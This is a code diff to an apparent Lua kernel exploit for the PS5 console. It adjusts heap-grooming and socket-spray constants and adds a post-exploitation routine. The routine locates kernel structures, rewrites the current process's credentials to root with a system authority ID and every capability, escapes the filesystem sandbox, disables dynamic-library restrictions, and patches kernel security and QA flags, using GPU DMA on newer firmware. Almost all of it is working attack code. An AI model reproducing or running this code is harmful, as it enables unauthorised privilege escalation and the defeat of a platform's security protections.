@@ -293,15 +293,15 @@ AIO_STATE_COMPLETE = 3
 AIO_STATE_ABORTED = 4
 
 
-MAIN_CORE = 3
+MAIN_CORE = 4
 MAIN_RTPRIO = 0x100
 
 NUM_WORKERS = 2
 NUM_GROOMS = 0x200
 NUM_HANDLES = 0x100
 NUM_RACES = 100
-NUM_SDS = 60
-NUM_ALT_SDS = 60
+NUM_SDS = 64
+NUM_SDS_ALT = 48
 NUM_ALIAS = 100
 LEAK_LEN = 16
 NUM_LEAKS = 16
@@ -1634,7 +1634,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds, sds
     end
 
     print("fixes applied")
-
 end
 
 
@@ -1644,7 +1643,177 @@ end
 
 
 function post_exploitation_ps5()
+
+    -- if we havent found allproc, assume we havent found every kernel offsets yet for this fw
+    if not kernel_offset.DATA_BASE_ALLPROC then
+        printf("fw not yet supported for jailbreaking")
+        return
+    end
+
+    local OFFSET_UCRED_CR_SCEAUTHID = 0x58
+    local OFFSET_UCRED_CR_SCECAPS = 0x60
+    local OFFSET_UCRED_CR_SCEATTRS = 0x83
+    local OFFSET_P_UCRED = 0x40
+
+    local KDATA_MASK = uint64("0xffff804000000000")
+
+    local SYSTEM_AUTHID = uint64("0x4800000000010003")
+
+    local function find_allproc()
+
+        local proc = kernel.addr.curproc
+        local max_attempt = 32
+
+        for i=1,max_attempt do
+            if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
+                local data_base = proc - kernel_offset.DATA_BASE_ALLPROC
+                if bit32.band(data_base.l, 0xfff) == 0 then
+                    return proc
+                end
+            end
+            proc = kernel.read_qword(proc + 0x8)  -- proc->p_list->le_prev
+        end
+
+        error("failed to find allproc")
+    end
+
+    local function get_dmap_base()
+
+        assert(kernel.addr.data_base)
+
+        local OFFSET_PM_PML4 = 0x20
+        local OFFSET_PM_CR3 = 0x28
+
+        local kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE
+
+        local pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
+        local cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
+        local dmap_base = pml4 - cr3
+        
+        return dmap_base, cr3
+    end
     
+    local function get_additional_kernel_address()
+    
+        kernel.addr.allproc = find_allproc()
+        kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC
+        kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE
+
+        local dmap_base, kernel_cr3 = get_dmap_base()
+        kernel.addr.dmap_base = dmap_base
+        kernel.addr.kernel_cr3 = kernel_cr3
+    end
+
+    local function escape_filesystem_sandbox(proc)
+    
+        local proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD) -- p_fd
+        local rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)
+
+        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
+        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
+    end
+
+    local function patch_dynlib_restriction(proc)
+
+        local dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)
+
+        kernel.write_dword(dynlib_obj_addr + 0x118, 0) -- prot (todo: recheck)
+        kernel.write_qword(dynlib_obj_addr + 0x18, 1) -- libkernel ref
+
+        -- bypass libkernel address range check (credit @cheburek3000)
+        kernel.write_qword(dynlib_obj_addr + 0xf0, 0) -- libkernel start addr
+        kernel.write_qword(dynlib_obj_addr + 0xf8, -1) -- libkernel end addr
+
+    end
+
+    local function patch_ucred(ucred, authid)
+
+        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
+        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
+        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
+        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
+        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
+
+        -- escalate sony privs
+        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) -- cr_sceAuthID
+
+        -- enable all app capabilities
+        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) -- cr_sceCaps[0]
+        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) -- cr_sceCaps[1]
+
+        -- set app attributes
+        kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) -- SceAttrs
+    end
+
+    local function escalate_curproc()
+
+        local proc = kernel.addr.curproc
+
+        local ucred = kernel.read_qword(proc + OFFSET_P_UCRED) -- p_ucred
+        local authid = SYSTEM_AUTHID
+
+        local uid_before = syscall.getuid():tonumber()
+        local in_sandbox_before = syscall.is_in_sandbox():tonumber()
+
+        dbgf("patching curproc %s (authid = %s)", hex(proc), hex(authid))
+
+        patch_ucred(ucred, authid)
+        patch_dynlib_restriction(proc)
+        escape_filesystem_sandbox(proc)
+
+        local uid_after = syscall.getuid():tonumber()
+        local in_sandbox_after = syscall.is_in_sandbox():tonumber()
+
+        printf("we root now? uid: before %d after %d", uid_before, uid_after)
+        printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
+    end
+
+    local function apply_patches_to_kernel_data(accessor)
+
+        local security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
+        local target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
+        local qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
+        local utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS
+
+        -- Set security flags
+        dbg("setting security flags")
+        local security_flags = accessor.read_dword(security_flags_addr)
+        accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))
+
+        -- Set targetid to DEX
+        dbg("setting targetid")
+        accessor.write_byte(target_id_flags_addr, 0x82)
+
+        -- Set qa flags and utoken flags for debug menu enable
+        dbg("setting qa flags and utoken flags")
+        local qa_flags = accessor.read_dword(qa_flags_addr)
+        accessor.write_dword(qa_flags_addr, bit64.bor(qa_flags, 0x10300))
+
+        local utoken_flags = accessor.read_byte(utoken_flags_addr)
+        accessor.write_byte(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))
+
+        print("debug menu enabled")
+    end
+
+    get_additional_kernel_address()
+
+    -- patch current process creds
+    escalate_curproc()
+
+    update_kernel_offsets()
+
+    -- init GPU DMA for kernel r/w on protected area
+    gpu.setup()
+
+    local force_kdata_patch_with_gpu = false
+
+    if tonumber(FW_VERSION) >= 7 or force_kdata_patch_with_gpu then
+        print("applying patches to kernel data (with GPU DMA method)")
+        apply_patches_to_kernel_data(gpu)
+    else
+        print("applying patches to kernel data")
+        apply_patches_to_kernel_data(kernel)
+    end
 end
 
 
@@ -1688,7 +1857,7 @@ function kexploit()
         table.insert(sds, new_socket())
     end
 
-    for i=1, NUM_ALT_SDS do
+    for i=1, NUM_SDS_ALT do
         table.insert(sds_alt, new_socket())
     end
 
